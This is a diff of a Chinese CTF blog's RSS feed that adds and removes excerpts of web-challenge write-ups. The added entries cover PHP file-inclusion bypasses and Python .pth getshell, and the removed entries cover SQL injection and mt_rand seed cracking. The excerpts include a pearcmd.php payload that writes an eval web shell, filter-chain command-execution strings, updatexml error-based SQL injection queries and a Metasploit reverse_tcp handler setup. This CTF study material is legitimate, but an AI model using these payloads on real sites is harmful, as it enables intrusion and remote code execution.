@@ -56,6 +56,42 @@ msf监听
 msfdb runuse exploit/multi/handler set payload linux/x64/meterpreter/reverse_tcpset LHOST 192.168.1.128set LPORT 4444exploit 执行1.]]></description>
 </item>
 <item>
+    <title>NSS#roun8 web专项赛</title>
+    <link>https://thnpkm.github.io/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/</link>
+    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/</guid>
+    <description><![CDATA[MyPage Where is my page？
+拿到题目就是这个样子
+感觉就是文件包含
+可以读取，可以用filter协议
+但是index.php怎么尝试都没读取到,data和input等协议都被ban了
+方法一： pearcmd.php filter读取不到index.php，可以试试pearcmd.php的姿势写shell
+index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);?&gt;+/tmp/shell.php 利用文件包含漏洞包含这个文件即可
+方法二：多级连接绕过 /proc/self/root/多级连接绕过 include_once
+?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/index.php ?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/flag.php 注意最后是proc/self/cwd/
+index.php源码是
+&lt;?php error_reporting(0); include &#39;flag.php&#39;; if(!isset($_GET[&#39;file&#39;])) { header(&#39;Location:/index.php?file=&#39;); } else { $file = $_GET[&#39;file&#39;]; if (!preg_match(&#39;/\.\.|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#39;, $file)) { include_once $file; } else { die(&#39;error.&#39;); } } include_once 不能重复包含,然后上面已经有include 'flag.php' 包含了，所以读不到flag.php
+至于不能正常读到index.php我比较迷惑，应该是执行这个文件其实已经算包含一遍了，也是include_once的问题，换成include就可以正常读。
+/proc/self/root/多级连接绕过原理可参考此文
+require_once 绕过不能重复包含文件的限制方法三： PHP Base64 Filter 宽松解析 我在写这题时候 用了这个方法，不过payload生成可能产生一点问题,复现倒是很顺
+&lt;?php $base64_payload = &#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;; /* &lt;?=`$_GET[0]`;;?&gt; */ $conversions = array( &#39;R&#39; =&gt; &#39;convert.]]></description>
+</item>
+<item>
+    <title>Python pth文件写入getshell</title>
+    <link>https://thnpkm.github.io/posts/ctf/python-pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/</link>
+    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/ctf/python-pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/</guid>
+    <description><![CDATA[原理：Python pth文件写入getshell 参考https://www.cnblogs.com/Nestar/p/17336664.html
+python的site模块支持&quot;Site-specific configuration hook&quot;的功能，这个功能点本身是用来将特定路径加入模块搜索路径。该模块在初始化期间自动导入
+sys.prefix和sys.exec_prefix在D:/Python，那么创建路径为D:\Python\Lib\site-packages\1.pth的pth文件，然后其内容为
+D:/Python/temp/ 重新启动python
+1.path的路径被添加到sys.path中
+site.py的实现中，有这么一段
+def addpackage(sitedir, name, known_paths): if known_paths is None: known_paths = _init_pathinfo() reset = True else: reset = False fullname = os.path.join(sitedir, name) _trace(f&#34;Processing .pth file: {fullname!r}&#34;) try: # locale encoding is not ideal especially on Windows. But we have used # it for a long time. setuptools uses the locale encoding too. f = io.TextIOWrapper(io.open_code(fullname), encoding=&#34;locale&#34;) except OSError: return with f: for n, line in enumerate(f): if line.]]></description>
+</item>
+<item>
     <title>三层靶机frp</title>
     <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/</link>
     <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
@@ -179,34 +215,6 @@ MFFMNMMFGHMMQWEMMTMMPMDFMMYMMRMKKKMMLMMGMPMPMMMMSMMVMMGMGMMMQMQMQMMMQMMMMEMEMEME
 到这里就挺迷惑的了
 也想到了找M对应的下标
 0 3 5 6 10 11 15 16 18 19 21 24 25 27 28 30 34 35 37 38 40 42 44 45 46 47 49 50 52 53 55 57 58 59 61 63 65 66 67 69 70 71 72 74 76 78 80 81 82 83 85 86 87 89 90 91 92 94 95 96 98 100 102 103 104 105 107 108 109 111 113 114 116 118 119 121 122 124 126 128 130 131 132 133 135 137 139 141 142 143 144 146 148 150 152 154 156 157 159 160 162 164 165 167 168 170 171 173 174 176 178 179 180 181 183 184 186 187 188 190 192 194 195 197 198 200 201 203 204 205 207 209 211 213 214 215 后面提示了找位置，但是没想到最后还是搞bin]]></description>
-</item>
-<item>
-    <title>b01lers CTF</title>
-    <link>https://thnpkm.github.io/posts/ctf/b01lers-ctf/</link>
-    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
-    <author>Author</author>
-    <guid>https://thnpkm.github.io/posts/ctf/b01lers-ctf/</guid>
-    <description><![CDATA[2023 web warmup 是一个flask的站，访问文件需要先base64编码
-/app.py编码拿到源码
-from base64 import b64decode import flask app = flask.Flask(__name__) @app.route(&#39;/&lt;name&gt;&#39;) def index2(name): name = b64decode(name) if (validate(name)): return &#34;This file is blocked!&#34; try: file = open(name, &#39;r&#39;).read() except: return &#34;File Not Found&#34; return file @app.route(&#39;/&#39;) def index(): return flask.redirect(&#39;/aW5kZXguaHRtbA==&#39;) def validate(data): if data == b&#39;flag.txt&#39;: return True return False if __name__ == &#39;__main__&#39;: app.run() 这里对flag.txt做了严格过滤，当时的思路还是什么加空格换行绕过，不过相对路径就可以绕过。
-./flag.txt相对路径，即可绕过检测
-fishy-motd 2020 web Welcome to Earth 之前buu写过了
-抓包一直找路由，一直走
-最后拿到flag]]></description>
-</item>
-<item>
-    <title>BUUCTF NewStarCTF</title>
-    <link>https://thnpkm.github.io/posts/ctf/buuctf-newstarctf/</link>
-    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
-    <author>Author</author>
-    <guid>https://thnpkm.github.io/posts/ctf/buuctf-newstarctf/</guid>
-    <description><![CDATA[week2 Word-For-You(2 Gen) 哇哇哇，我把查询界面改了，现在你们不能从数据库中拿到东西了吧哈哈（不过为了调试的代码似乎忘记删除了
-联合查询 ，没有回显点
-报错查询
-name=1&#39;and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;wfy_comments&#39;),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select right(group_concat(text),28) from wfy.wfy_comments),0x7e),1)--+ IncludeOne 文件包含漏洞系列第一题，也不知道是不是真的随机？ 出题人丢给你了一个工具：https://www.openwall.com/php_mt_seed/
-&lt;?php highlight_file(__FILE__); error_reporting(0); include(&#34;seed.php&#34;); //mt_srand(*********); echo &#34;Hint: &#34;.mt_rand().&#34;&lt;br&gt;&#34;; if(isset($_POST[&#39;guess&#39;]) &amp;&amp; md5($_POST[&#39;guess&#39;]) === md5(mt_rand())){ if(!preg_match(&#34;/base|\.\./i&#34;,$_GET[&#39;file&#39;]) &amp;&amp; preg_match(&#34;/NewStar/i&#34;,$_GET[&#39;file&#39;]) &amp;&amp; isset($_GET[&#39;file&#39;])){ //flag in `flag.php` include($_GET[&#39;file&#39;]); }else{ echo &#34;Baby Hacker?&#34;; } }else{ echo &#34;No Hacker!&#34;; } Hint: 1219893521 给了mt_rand，用提示给的网站工具，进行爆破
-拿到正确的种子
-&lt;?php mt_srand(1145146); mt_rand(); echo mt_rand(); ?]]></description>
 </item>
 </channel>
 </rss>
